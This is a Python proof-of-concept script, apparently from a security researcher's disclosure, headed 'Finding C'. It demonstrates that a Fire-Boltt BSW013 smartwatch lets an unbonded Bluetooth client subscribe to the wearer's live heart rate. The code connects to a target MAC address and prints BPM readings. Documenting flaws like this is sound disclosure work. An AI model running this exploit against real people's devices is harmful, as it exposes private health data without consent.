"""
Finding C: Unauthenticated Live Heart Rate Disclosure
Fire-Boltt BSW013 Smartwatch, Firmware V0.0.8

Subscribes to the standard Bluetooth SIG Heart Rate Measurement
characteristic from a fully unbonded connection. No custom protocol
knowledge is required -- this is the standard, publicly documented
Heart Rate Service; the vulnerability is the watch's failure to require
bonding before allowing a client to subscribe.

Requires: bleak (pip install bleak)
"""

import asyncio
from bleak import BleakClient

WATCH_MAC = "XX:XX:XX:XX:XX:XX"  # replace with target watch MAC
HEART_RATE_MEASUREMENT_UUID = "00002a37-0000-1000-8000-00805f9b34fb"


def heart_rate_handler(sender, data):
    flags = data[0]
    hr_format_16bit = flags & 0x01
    if hr_format_16bit:
        bpm = int.from_bytes(data[1:3], byteorder="little")
    else:
        bpm = data[1]
    print(f"  [HEART RATE] {bpm} bpm (raw: {data.hex(' ').upper()})")


async def main():
    print(f"Connecting to {WATCH_MAC} (no pairing/bonding performed)...")
    async with BleakClient(WATCH_MAC) as client:
        print("Connected! Subscribing to Heart Rate Measurement notifications...")
        await client.start_notify(HEART_RATE_MEASUREMENT_UUID, heart_rate_handler)
        print(">>> Waiting for live BPM readings (wearer must have HR monitoring active) <<<")
        await asyncio.sleep(30)
        print("Done.")


if __name__ == "__main__":
    asyncio.run(main())
